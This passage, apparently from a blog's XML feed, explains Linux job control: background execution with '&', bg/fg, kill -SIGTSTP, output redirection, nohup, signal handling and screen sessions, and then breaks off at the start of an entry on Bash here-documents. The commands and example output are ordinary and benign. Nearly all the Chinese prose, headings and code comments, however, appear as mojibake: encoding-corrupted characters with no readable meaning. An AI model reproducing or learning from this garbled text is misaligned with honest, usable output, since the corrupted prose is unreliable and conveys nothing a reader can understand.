ç¯å¢ƒä¸­æ‰€èµ·çš„åå°æ­£åœ¨è¿è¡Œæˆ–è€…è¢«æŒ‚èµ·çš„ä»»åŠ¡ä¿¡æ¯ï¼›</p></li><li><p>è¿›ç¨‹çš„æŒ‚èµ·</p><p>åå°è¿›ç¨‹çš„æŒ‚èµ·ï¼š</p><p><code>kill -SIGTSTP PID</code></p><p>é€šè¿‡ stop å‘½ä»¤æ‰§è¡Œï¼Œé€šè¿‡ jobs å‘½ä»¤æŸ¥çœ‹ job å·(å‡è®¾ä¸º num)ï¼Œç„¶åæ‰§è¡Œstop %numï¼›</p><p>å½“è¦é‡æ–°æ‰§è¡Œå½“å‰è¢«æŒ‚èµ·çš„ä»»åŠ¡æ—¶ï¼Œé€šè¿‡ <code>bg %num</code>å³å¯å°†æŒ‚èµ·çš„ job çš„çŠ¶æ€ç”± suspended æ”¹ä¸ºrunningï¼Œä»åœ¨åå°æ‰§è¡Œï¼›å½“éœ€è¦æ”¹ä¸ºåœ¨å‰å°æ‰§è¡Œæ—¶ï¼Œæ‰§è¡Œå‘½ä»¤<code>fg %num</code> å³å¯</p></li></ol><h2 id="åå°æ‰§è¡Œ">åå°æ‰§è¡Œ</h2><p>å½“æˆ‘ä»¬å¸Œæœ›ä»»åŠ¡åœ¨åå°æ‰§è¡Œï¼Œæˆ‘ä»¬å¯ä»¥åœ¨å‘½ä»¤çš„æœ€ååŠ ä¸Š<code>&amp;</code>ï¼Œç„¶åå°±å¯ä»¥åœ¨å‰å°åšåˆ«çš„äº‹æƒ…å•¦ã€‚è€Œä¸”è¿™æ ·ä¹Ÿä¸ä¼šå› ä¸ºCtrl+C å‘å‡º <code>SIGINT</code> ä¿¡å·è€Œç»ˆæ­¢å‰å°è¿›ç¨‹å•¦ã€‚æˆ‘ä»¬æ—¥å¸¸ä½¿ç”¨çš„Ctrl+z ä¹Ÿæ˜¯ä½¿ç¨‹åºåå°æŒ‚èµ·ã€‚</p><p>ä½†æ˜¯è¦æ˜¯ä»»åŠ¡éœ€è¦ä» stdin è¯»å–è¾“å…¥æˆ–è€…å‘ stdout è¾“å‡ºä¼šæ€ä¹ˆæ ·å‘¢ï¼Ÿç­”æ¡ˆæ˜¯ï¼šè¾“å‡ºä»ç„¶ä¼šåœ¨å‰å°è¾“å‡ºï¼Œé€ æˆä¸€ç§é”™ä¹±çš„æ„Ÿè§‰ï¼ˆå“ˆå“ˆï¼‰ï¼Œè€Œå¦‚æœä½ å°†éœ€è¦è¾“å…¥çš„ä»»åŠ¡ç›´æ¥æ”¾åˆ°åå°ï¼Œé‚£å®ƒæ²¡åŠæ³•åœ¨åå°è¯»å–è¾“å…¥ã€‚</p><h3 id="è¾“å‡º">è¾“å‡º</h3><p>æ¡ˆä¾‹ï¼š python è„šæœ¬å¾ªç¯è¾“å‡º</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># num = int(input(&quot;è¯·è¾“å…¥å¾ªç¯æ¬¡æ•°ï¼š&quot;))</span></span><br><span class="line">num = <span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;HelloWorld: &quot;</span>, i)</span><br><span class="line">   time.sleep(<span class="number">1</span>)  <span class="comment">#æ¯è¾“å‡ºä¸€è¡Œå°±ä¼‘çœ 1ç§’</span></span><br></pre></td></tr></table></figure><p>é¦–å…ˆæ˜¯åªæœ‰è¾“å‡ºçš„æƒ…å†µï¼Œä¼šåœ¨å‰å°è¾“å‡ºï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/testsh [16:52:59]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">python test.py &amp;</span></span><br><span class="line">[1] 30213</span><br><span class="line">HelloWorld:  0</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/testsh [16:53:07]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">HelloWorld:  1</span></span><br><span class="line">HelloWorld:  2</span><br><span class="line">HelloWorld:  3</span><br><span class="line"></span><br><span class="line">[1]  + 30213 done       python test.py</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/testsh [16:53:11]</span></span><br><span class="line"><span class="meta prompt_">$</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹å‡ºæˆ‘ä»¬é€šè¿‡ <code>python test.py &amp;</code>å°†å…¶æ”¾åœ¨åå°æ‰§è¡Œï¼Œç„¶è€Œè¾“å‡ºè¿˜æ˜¯åœ¨å‰å°ï¼Œä¸”å’Œ<code># violetv at manjaro in ~/testsh [16:53:07]</code>æœ‰äº›äº¤å‰æ··ä¹±ã€‚å› æ­¤ï¼Œå¦‚æœæˆ‘ä»¬ä¸æƒ³è¿™æ ·ï¼Œæˆ‘ä»¬å¯ä»¥å°†æ ‡å‡†è¾“å‡ºå’Œé”™è¯¯è¾“å‡ºé‡å®šå‘è‡³ï¼ˆæ™®é€šæˆ–è€…è®¾å¤‡ï¼‰æ–‡ä»¶ã€‚ä¾‹å¦‚ï¼š<code>python test.py &amp;&gt;/dev/null &amp;</code> æˆ–<code>python test.py &gt; result.txt &amp;</code></p><h3 id="è¾“å…¥">è¾“å…¥</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">num = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;è¯·è¾“å…¥å¾ªç¯æ¬¡æ•°ï¼š&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;HelloWorld: &quot;</span>, i)</span><br><span class="line">   time.sleep(<span class="number">1</span>)  <span class="comment">#æ¯è¾“å‡ºä¸€è¡Œå°±ä¼‘çœ 1ç§’</span></span><br></pre></td></tr></table></figure><h4 id="ä¸å¸¸ç”¨æ“ä½œ">ä¸å¸¸ç”¨æ“ä½œ</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">python test.py &gt; result.txt &amp;</span></span><br><span class="line">[1] 30598</span><br><span class="line">[1]  + 30598 suspended (tty input)  python test.py &gt; result.txt</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ° <code>suspended (tty input)</code>è¯´æ˜å®ƒåœ¨ç­‰å¾…å‰å°ç»ˆç«¯è¾“å…¥ï¼Œç„¶è€Œå®ƒåˆåœ¨åå°è¿è¡Œï¼Œå®ƒæ— æ³•è·å–ä¸åˆ°å‰å°è¾“å…¥ï¼Œå› æ­¤å®ƒå°±åœ¨åå°ä¸€ç›´ç­‰ç€å‰å°è¾“å…¥ï¼ˆæŒ‚ç€ï¼Œç›¸å½“äºåƒµå°¸è¿›ç¨‹ï¼‰ã€‚è¿™ç§æƒ…å†µï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨ <code>fg</code>(è¿™é‡Œåªæœ‰ä¸€ä¸ªåå°ä»»åŠ¡ï¼Œæ‰€ä»¥æ²¡æœ‰åŠ <code>%n</code>)ï¼Œå†æŠŠå®ƒè°ƒåˆ°å‰å°è¿›è¡Œè¾“å…¥</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/testsh [16:59:33]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">fg</span></span></span><br><span class="line">[1]  + 30598 continued  python test.py &gt; result.txt</span><br><span class="line">3</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/testsh [17:04:02]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> result.txt</span></span><br><span class="line">è¯·è¾“å…¥å¾ªç¯æ¬¡æ•°ï¼šHelloWorld:  0</span><br><span class="line">HelloWorld:  1</span><br><span class="line">HelloWorld:  2</span><br></pre></td></tr></table></figure><h4 id="å¸¸ç”¨æ“ä½œ">å¸¸ç”¨æ“ä½œ</h4><p>é‡å®šå‘è¯¥ä»»åŠ¡çš„è¾“å…¥ï¼š</p><ol type="1"><li><p>é‡å®šå‘æ–‡ä»¶</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/testsh [17:10:50]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> loop_num.txt</span></span><br><span class="line">4</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/testsh [17:11:21]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">python test.py &lt; loop_num.txt &amp;&gt;/dev/null &amp;</span></span><br><span class="line">[1] 31297</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/testsh [17:11:26]</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">[1]  + 31297 <span class="keyword">done</span>       python test.py &lt; loop_num.txt &amp;&gt; /dev/null</span></span><br></pre></td></tr></table></figure></p></li><li><p>å…¶ä»–å‘½ä»¤ç»“æœ+ç®¡é“</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/testsh [17:10:00]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> 3 |python test.py &amp;&gt;/dev/null &amp;</span></span><br><span class="line">[1] 31159 31160</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/testsh [17:10:19]</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">[1]  + 31159 <span class="keyword">done</span>       <span class="built_in">echo</span> 3 |</span></span><br><span class="line">    31160 done       python test.py &amp;&gt; /dev/null</span><br></pre></td></tr></table></figure></p></li></ol><h2 id="åŸç†æ¢ç©¶"><code>&amp;</code> åŸç†æ¢ç©¶</h2><p>æˆ‘ä»¬å¸¸å¸¸ç”¨æ¥ç»ˆæ­¢ä»»åŠ¡çš„ <code>Ctrl+C</code> å¿«æ·é”®ï¼Œæœ¬è´¨æ˜¯å‘è¯¥ä»»åŠ¡å‘é€<code>SIGINT</code> ä¿¡å·ï¼Œç„¶åä»»åŠ¡æ”¶åˆ°è¯¥ä¿¡å·ï¼Œç»ˆæ­¢ã€‚è€Œ<code>&amp;</code> åˆ™å¿½ç•¥ <code>SIGINT</code>ä¿¡å·ï¼Œå› æ­¤ï¼Œå¯¹åå°ç¨‹åºè€Œè¨€ï¼Œæˆ‘ä»¬æ— æ³•é€šè¿‡è¯¥å¿«æ·é”®æ¥ç»ˆæ­¢ã€‚</p><p>æˆ‘ä»¬æ—¥å¸¸ä½¿ç”¨çš„ Ctrl+z å’Œ <code>&amp;</code>å¯ä»¥è¾¾åˆ°ç›¸åŒçš„æ•ˆæœï¼ˆåªä¸è¿‡å‰è€…è¦äººæ‰‹åŠ¨æŒ‰å¿«æ·é”®ï¼Œä¸åˆ©äºè‡ªåŠ¨åŒ–ï¼‰ï¼ŒäºŒè€…éƒ½æ˜¯é€šè¿‡å‘ç¨‹åºå‘é€<code>SIGTSTP</code> ä¿¡å·ï¼Œä½¿å…¶åå°æŒ‚èµ·çš„ã€‚</p><p>æˆ‘ä»¬ä¸¤ç§æ–¹æ³•äººä¸ºç»ˆæ­¢å®ƒï¼š</p><ol type="1"><li>æŸ¥æ‰¾å…¶ PIDï¼Œä½¿ç”¨ <code>kill</code> å‘½ä»¤äººä¸ºå‘é€ç»ˆæ­¢ä¿¡å·ã€‚</li><li>ä½¿ç”¨ <code>jobs</code> æŸ¥çœ‹å…¶ä¸ºç¬¬ n ä¸ªåå°è¿›ç¨‹ï¼Œç¡®å®š nï¼Œ ä½¿ç”¨<code>fg %n</code> å°†å…¶è°ƒåˆ°å‰å°ï¼Œç„¶åä½¿ç”¨ <code>Ctrl+C</code>å°†å…¶ç»ˆæ­¢ã€‚</li></ol><h2 id="ä¸å—ç»ˆç«¯æŒ‚æ–­å½±å“">ä¸å—ç»ˆç«¯æŒ‚æ–­å½±å“</h2><p><code>nohup</code>ï¼š å³ no hang upï¼Œä¸æŒ‚æ–­çš„è¿è¡Œï¼Œé€šè¿‡åœ¨å‘½ä»¤å‰åŠ <code>nohup</code>ï¼Œå°±å¯ä»¥åœ¨æ–­å¼€ç»ˆç«¯çš„æ—¶å€™ï¼Œä¸å½±å“çš„ç»§ç»­äº†ã€‚è¿™ä¸ªåœ¨æˆ‘ä»¬ssh è¿œç¨‹è¿æ¥æœåŠ¡å™¨ï¼Œåœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œè€—æ—¶ä»»åŠ¡çš„æ—¶å€™ï¼Œæå…¶æœ‰ç”¨ã€‚</p><p>ä¾‹å¦‚ï¼š<code>nohup sleep 2000</code>,ç„¶åå…³é—­ç»ˆç«¯ã€‚å†æ‰“å¼€ä½¿ç”¨<code>ps aux|grep sleep</code> æŸ¥çœ‹, å®ƒä»ç„¶è¿è¡Œã€‚</p><p>æ³¨æ„ï¼šä½¿ç”¨ <code>nohup</code>æ—¶ï¼Œå¦‚æœä¸æŒ‡å®šè¾“å‡ºæ–‡ä»¶ï¼Œé»˜è®¤è¾“å‡ºåˆ°å½“å‰ç›®å½•ä¸‹çš„<code>nohup.out</code>æ–‡ä»¶</p><h2 id="nohup-åŸç†æ¢ç©¶"><code>nohup</code> åŸç†æ¢ç©¶</h2><p>ç»ˆç«¯æŒ‚æ–­çš„æ—¶å€™ï¼Œä¼šå‘ä¹‹å‰ç»ˆç«¯å¯åŠ¨çš„ç¨‹åºå‘é€ <code>SIGHUP</code>ä¿¡å·ï¼Œä½¿å¾—è¿™äº›ä»»åŠ¡ç»ˆæ­¢ã€‚è€Œ <code>nohup</code> çš„æ„æ€å°±æ˜¯å¿½ç•¥<code>SIGHUP</code> ä¿¡å·ï¼Œå› æ­¤å½“è¿è¡Œ <code>nohup sleep 2000</code>çš„æ—¶å€™ï¼Œ å…³é—­ shell, é‚£ä¹ˆè¿™ä¸ªè¿›ç¨‹è¿˜æ˜¯å­˜åœ¨çš„ã€‚</p><h2 id="ç»¼åˆ">ç»¼åˆ</h2><p>å¯¹äº <code>sleep 2000 &amp;</code> åå°å‘½ä»¤ï¼Œæˆ‘ä»¬å…³é—­ shellçš„æ—¶å€™ï¼Œå‘ä¹‹å‰ç»ˆç«¯å¯åŠ¨çš„æ‰€æœ‰ç¨‹åºå‘é€ <code>SIGHUP</code>ä¿¡å·ï¼Œå®ƒä¹Ÿä¸ä¾‹å¤–ï¼Œç…§æ ·ç»ˆæ­¢ã€‚</p><p>å¯¹äº <code>nohup sleep 2000</code> ä¸æŒ‚æ–­å‘½ä»¤ï¼Œæˆ‘ä»¬æŒ‰ Ctrl+Cçš„æ—¶å€™ï¼Œå‘è¯¥è¿›ç¨‹å‘é€ <code>SIGINT</code> ä¿¡å·ï¼Œè¯¥è¿›ç¨‹ç…§æ ·ç»ˆæ­¢ã€‚</p><p>æ€»ç»“ï¼ŒäºŒè€…éƒ½åªæ˜¯å¯¹å¯¹åº”çš„ä¸€ä¸ªä¿¡å·è¿›è¡Œäº†å¿½ç•¥ï¼Œä¸èƒ½å¿½ç•¥å…¶ä»–çš„ã€‚</p><p>ä½†æ˜¯å¦‚æœåœ¨è¿œç¨‹ sshè¿æ¥æœåŠ¡å™¨ï¼Œæˆ‘ä»¬æƒ³åœ¨ä¸€ä¸ªç»ˆç«¯é‡Œé¢æ‰§è¡Œè€—æ—¶ä»»åŠ¡çš„åŒæ—¶ï¼Œå¹²åˆ«çš„äº‹æƒ…æ€ä¹ˆåŠï¼Ÿ</p><p>é‚£å°±å°†äºŒè€…ç»“åˆèµ·æ¥ï¼Œå°±å¯ä»¥å®ç°åœ¨åå°è¿è¡Œï¼ˆå¯ä»¥è®©æˆ‘ä»¬æ¥ç€ç”¨å‰å°ï¼Œè€Œä¸”åå°ä»»åŠ¡ä¸ä¼šå› ä¸º<code>Ctrl+C</code> ç»ˆæ­¢ï¼‰ï¼Œä¸”ä¸å—ç»ˆç«¯æŒ‚æ–­å½±å“ã€‚</p><h2 id="screen">screen</h2><p><code>screen</code> is good for interactive processes, where youmight need to detach and reattach a session. <code>nohup</code> is bestfor unattended processes like userspace daemons or processes you willcheck on later.</p><p><code>screen</code> ä¸€èˆ¬æ˜¯æˆ‘ä»¬äº¤äº’ï¼Œéœ€è¦å®æ—¶çœ‹ç»“æœçš„æ—¶å€™ç”¨çš„ï¼Œ<code>nohup</code> ä¸€èˆ¬æ˜¯æˆ‘ä»¬éœ€è¦ç­‰æœ€åçœ‹ç»“æœæ—¶ç”¨çš„ã€‚</p><p>screen é¢„è£…åœ¨å¤§å¤šæ•° linux æœºå™¨ä¸Šï¼Œå¯ä»¥ä½¿ç”¨<code>screen --version</code> æ£€æŸ¥å®ƒæ˜¯å¦è¢«å®‰è£…ã€‚</p><p>ä¸€èˆ¬æµç¨‹:</p><ol type="1"><li><p><code>screen -S session_name</code> åˆ›å»ºä¸€ä¸ªåä¸º session_name çš„session ä¼šè¯</p></li><li><p>åœ¨ç»ˆç«¯é‡Œæ­£å¸¸è¿›è¡Œä½ çš„å·¥ä½œ,ç”šè‡³æ˜¯è¿›è¡Œä¸€äº›å ç”¨å‰å°ç»ˆç«¯å¸¦è¾“å‡ºçš„è€—æ—¶ä»»åŠ¡</p></li><li><p>ç„¶åç»ˆç«¯çªç„¶æ–­å¼€ï¼ˆssh æ–­å¼€æˆ–è€…ç”µè„‘æ–­ç”µï¼‰</p></li><li><p>ä½ é‡è¿ç»ˆç«¯</p><ol type="1"><li><p><code>screen -list</code> æˆ–è€… <code>screen -ls</code> æŸ¥çœ‹screen çš„åˆ—è¡¨ï¼Œä¹Ÿå°±æ˜¯ session åˆ—è¡¨ã€‚</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">VM-0-17-ubuntu% </span><span class="language-bash">screen -list</span></span><br><span class="line">There are screens on:</span><br><span class="line">    9408.test   (06/26/2020 10:28:03 AM)    (Detached)</span><br><span class="line">    9256.pts-0.VM-0-17-ubuntu   (06/26/2020 10:27:41 AM)    (Detached)</span><br><span class="line">    8127.test   (06/26/2020 10:21:17 AM)    (Detached)</span><br><span class="line">    29226.pts-0.VM-0-17-ubuntu  (06/24/2020 10:45:18 AM)    (Detached)</span><br><span class="line">4 Sockets in /run/screen/S-ubuntu.</span><br></pre></td></tr></table></figure></p><p>detached(åˆ†ç¦»ï¼‰ï¼Œè¯´æ˜ä½ å½“å‰ä¸è¯¥ session åˆ†ç¦»ï¼Œå³ï¼šä¸å¤„äºè¯¥ sessionä¸­</p><p>å¦‚æœä½ åœ¨ä¸€ä¸ª screen session é‡Œé¢è¿è¡Œè¯¥å‘½ä»¤ï¼Œåˆ™æœ‰ç±»ä¼¼ç»“æœ</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">VM-0-17-ubuntu% </span><span class="language-bash">screen -list</span></span><br><span class="line">There are screens on:</span><br><span class="line">        9408.test       (06/26/2020 10:28:02 AM)        (Attached)</span><br><span class="line">        9256.pts-0.VM-0-17-ubuntu       (06/26/2020 10:27:40 AM)        (Detached)</span><br><span class="line">        8127.test       (06/26/2020 10:21:16 AM)        (Detached)</span><br><span class="line">        29226.pts-0.VM-0-17-ubuntu      (06/24/2020 10:45:17 AM)        (Detached)</span><br><span class="line">4 Sockets in /run/screen/S-ubuntu.</span><br></pre></td></tr></table></figure></p><p>å…¶ä¸­ (Attached) æ ‡è¯†çš„ä¾¿æ˜¯ä½ å½“å‰æ‰€åœ¨çš„ screen sessionã€‚</p><p>ä½ å¯ä»¥ä½¿ç”¨å¿«æ·é”® <code>Ctrl+a d</code>ï¼ˆè¿™æ˜¯å…ˆæŒ‰ ctrl+aï¼Œå†æŒ‰ ctrl+dçš„æ„æ€ï¼‰åœ¨ä»»ä½•æ—¶å€™ detach å‡ºä¸€ä¸ª screen sessionã€‚</p></li><li><p><code>screen -r [session]</code> ä¸€èˆ¬<code>[session]</code>æˆ‘ä»¬å†™å‰é¢çš„æ•°å­—å³å¯ï¼Œå¦‚ï¼š9408ï¼Œå½“ç„¶å¦‚æœ tab è¡¥å…¨å†™ä¸º 9408.testä¹Ÿå¯ï¼Œåªè¦èƒ½å”¯ä¸€è¡¨ç¤ºå°±è¡Œã€‚ ä¾‹å¦‚ï¼š<code>screen -r 9408.test</code></p></li><li><p><code>exit</code> æˆ–è€… <code>Ctrl+d</code> ç»ˆæ­¢ä¸€ä¸ª screensession</p></li></ol></li></ol><h2 id="ç»“è®º">ç»“è®º</h2><p>ä½¿ç”¨ <code>&amp;</code> åå°è¿è¡Œç¨‹åºï¼š</p><ol type="1"><li>ç»“æœä¼šè¾“å‡ºåˆ°ç»ˆç«¯</li><li>ä½¿ç”¨ Ctrl + C å‘é€ SIGINT ä¿¡å·ï¼Œç¨‹åºå¿½ç•¥</li><li>å…³é—­ session å‘é€ SIGHUP ä¿¡å·ï¼Œç¨‹åºå…³é—­</li></ol><p>ä½¿ç”¨ <code>nohup</code> è¿è¡Œç¨‹åºï¼š</p><ol type="1"><li>ç»“æœé»˜è®¤ä¼šè¾“å‡ºåˆ° nohup.out</li><li>ä½¿ç”¨ Ctrl + C å‘é€ SIGINT ä¿¡å·ï¼Œç¨‹åºå…³é—­</li><li>å…³é—­ session å‘é€ SIGHUP ä¿¡å·ï¼Œç¨‹åºå¿½ç•¥</li></ol><p>ä½¿ç”¨ <code>nohup</code> å’Œ <code>&amp;</code>é…åˆæ¥å¯åŠ¨ç¨‹åºï¼ŒåŒæ—¶å¿½ç•¥ SIGINT å’Œ SIGHUP ä¿¡å·</p><p>æœ€ä½³å®è·µæ–¹æ¡ˆï¼š</p><p>ä¸è¦å°†ä¿¡æ¯è¾“å‡ºåˆ°ç»ˆç«¯æ ‡å‡†è¾“å‡ºï¼Œæ ‡å‡†é”™è¯¯è¾“å‡ºï¼Œè€Œè¦ç”¨æ—¥å¿—ç»„ä»¶å°†ä¿¡æ¯è®°å½•åˆ°æ—¥å¿—é‡Œ</p><p><code>nohup</code> å‘½ä»¤å¯ä»¥å°†æ—¥å¿—è¾“å…¥åˆ°æ–‡ä»¶ä¸­</p><p><code>screen</code> é€‚åˆäº¤äº’å®æ—¶, <code>nohup</code>é€‚åˆæ— äº¤äº’éå®æ—¶ï¼Œè‡ªåŠ¨åŒ–.</p><h2 id="å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™</h2><p><a href="http://archive.ambermd.org/200501/0179.html">Re: AMBER:Suspended (tty input)</a></p><p><a href="https://www.cnblogs.com/mingyue5826/p/11572228.html">Linuxä¸­ nohup å’Œ&amp;çš„ç”¨æ³•å’ŒåŒºåˆ«</a></p><p><ahref="https://blog.51cto.com/10808695/1841519">å¦‚ä½•æ€æ­»ï¼Œæš‚åœï¼Œç»§ç»­ä¸€ä¸ªåå°è¿›ç¨‹</a></p><p><a href="https://linuxize.com/post/how-to-use-linux-screen/">How ToUse Linux Screen</a></p><p><ahref="https://stackoverflow.com/questions/17072463/is-screen-better-than-nohup">Isâ€œscreenâ€ better than â€œnohupâ€? [closed]</a></p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bash Here document</title>
      <link href="/blog/2020/07/13/programming/shell/heredoc/"/>
      <url>/blog/2020/07/13/programming/shell/heredoc/</url>
      
        <content type="html"><![CDATA[<h2 id="åœºæ™¯">åœºæ™¯</h2><p>åœ¨ç¼–å†™ shell è„šæœ¬æ—¶ï¼Œå¯èƒ½ä¼šé‡åˆ°éœ€è¦å°† <code>å¤šè¡Œæ–‡æœ¬å—æˆ–ä»£ç </code>ä¼ é€’ç»™ <code>äº¤äº’å¼å‘½ä»¤(å¦‚teeã€catæˆ–sftp)</code> çš„æƒ…å†µã€‚åœ¨ Bash å’Œå…¶ä»–shell(å¦‚ Zsh)ä¸­ï¼Œ<strong>Here document(Heredoc)æ˜¯ä¸€ç§å…è®¸ä½ å‘å‘½ä»¤ä¼ é€’å¤šè¡Œè¾“å…¥çš„é‡å®šå‘</strong>ã€‚</p><p>here æ–‡æ¡£å¸¸è¢« shell è„šæœ¬ç”¨æ¥ç”Ÿæˆèœå•æˆ–è¢«ç”¨æ¥å¤šè¡Œæ³¨é‡Š</p><h2 id="è¯­æ³•">è¯­æ³•</h2><p>HereDoc è¯­æ³•å¦‚ä¸‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[COMMAND] &lt;&lt;[-] &#x27;DELIMITER&#x27;</span><br><span class="line">  HERE-DOCUMENT</span><br><span class="line">DELIMITER</span><br></pre></td></tr></table></figure><ol type="1"><li><p>ç¬¬ä¸€è¡Œä»¥å¯é€‰å‘½ä»¤å¼€å¤´ï¼Œåé¢è·Ÿé‡å®šå‘æ“ä½œç¬¦ <code>&lt;&lt;</code>å’Œåˆ†éš”ç¬¦ã€‚</p></li><li><p>å¯ä»¥ä½¿ç”¨ä»»ä½•å­—ç¬¦ä¸²ä½œä¸ºåˆ†éš”æ ‡è¯†ç¬¦ï¼Œæœ€å¸¸ç”¨çš„æ˜¯ <code>EOF</code> æˆ–<code>END</code>ã€‚</p></li><li><p>å¦‚æœåˆ†éš”ç¬¦æ²¡æœ‰è¢«å¼•å·åŒ…å›´ï¼Œ shell å°†ä¼šåœ¨è§£æ here-documentåˆ°å‘½ä»¤å‰ï¼Œæ›¿æ¢è§£ææ‰€æœ‰å˜é‡ã€å‘½ä»¤å’Œç‰¹æ®Šå­—ç¬¦æ³¨ï¼šåœ¨å­—ç¬¦ä¸²ä¸­ï¼Œå¦‚æœéœ€è¦ä½¿ç”¨å˜é‡æˆ–è€…å‘½ä»¤</p><ol type="1"><li><p>å¯¹äºç¯å¢ƒå˜é‡ï¼Œä½¿ç”¨ <code>$ç¯å¢ƒå˜é‡å</code>ï¼Œå¦‚ï¼š<code>$PWD</code>ã€<code>$SHELL</code></p></li><li><p>å¯¹äºå‘½ä»¤ï¼Œä½¿ç”¨ <code>$(pwd)</code>ã€</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/testsh [11:22:05]</span></span><br><span class="line"><span 